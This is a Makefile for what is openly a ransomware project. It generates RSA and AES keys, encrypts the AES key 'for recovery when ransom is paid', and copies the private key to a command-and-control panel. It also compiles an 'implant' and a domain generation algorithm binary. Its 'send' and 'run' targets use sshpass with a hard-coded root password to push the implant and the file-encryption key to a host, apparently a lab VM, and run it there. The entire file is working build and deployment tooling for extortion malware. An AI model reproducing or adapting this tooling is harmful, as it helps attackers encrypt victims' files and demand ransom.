CC=musl-gcc
CFLAGS=-Wall -Wextra -Werror -Os -static
NAME=implant
RNAME=$(NAME)
PASS=root
PORT=5555
HOST=root@localhost

SDIR=src/implant
DDIR=src/dga
CDIR=crypto
PDIR=../cnc/server/code/files/nGQ9xF84C/

all: keys dga $(NAME)

keys:
	@mkdir -p crypto
	@echo "[+] Generate private key"
	openssl genrsa -out $(CDIR)/key.pem 2048
	openssl rsa -in $(CDIR)/key.pem -text -noout
	@echo "[+] Generate public key"
	openssl rsa -in $(CDIR)/key.pem -pubout -out $(CDIR)/pub.pem
	openssl rsa -in $(CDIR)/pub.pem -pubin -text -noout
	@echo "[+] Copy key.pem to the panel"
	# User will have to extract encrypted key 'key' from filesystem to retrieve a plaintext aes key 
	cp $(CDIR)/key.pem $(PDIR)/key.pem
	@echo "[+] Generate 256 bit random key"
	openssl rand -base64 32 > $(CDIR)/key.bin
	@echo "[+] Encrypt the key"
	openssl rsautl -encrypt -inkey $(CDIR)/pub.pem -pubin -in $(CDIR)/key.bin -out $(CDIR)/key.bin.enc

dga:
	$(CC) $(CFLAGS) $(SDIR)/dga.c $(DDIR)/main.c -o dga

$(NAME):
	@echo "[+] Build $(NAME)"
	$(CC) $(CFLAGS) $(shell find $(SDIR) ! -name "mbr.c" -name "*.c") -o $(NAME)
	strip $(NAME)

send: $(NAME)
	@echo "[+] Send $(NAME) and today is $(shell ./dga)"
	@echo "[!] There must be only one domain per IP! The first one will be picked up for resolution"
	sshpass -p $(PASS) ssh -p $(PORT) $(HOST) 'echo "10.0.2.2 $(shell ./dga)" >> /etc/hosts'
	@echo "[+] Send AES key to be used to encrypt local files"
	sshpass -p $(PASS) scp -P $(PORT) $(CDIR)/key.bin $(HOST):key.bin
	@echo "[+] Send encrypted AES key to be used for recovery when ransom is paid"
	sshpass -p $(PASS) scp -P $(PORT) $(CDIR)/key.bin.enc $(HOST):key
	@echo "[+] Send implant"
	sshpass -p $(PASS) scp -P $(PORT) $(NAME) $(HOST):$(RNAME)

run: send
	@echo "[+] Run $(NAME)"
	sshpass -p $(PASS) ssh -p $(PORT) $(HOST) './$(RNAME)'

re: clean all

debug: CFLAGS += -g3 -O0 -D DEBUG
debug: re
	@echo "[+] Debug mode enabled"

hardcore: CC = clang -Weverything
hardcore: re

clean:
	rm -f $(NAME) dga
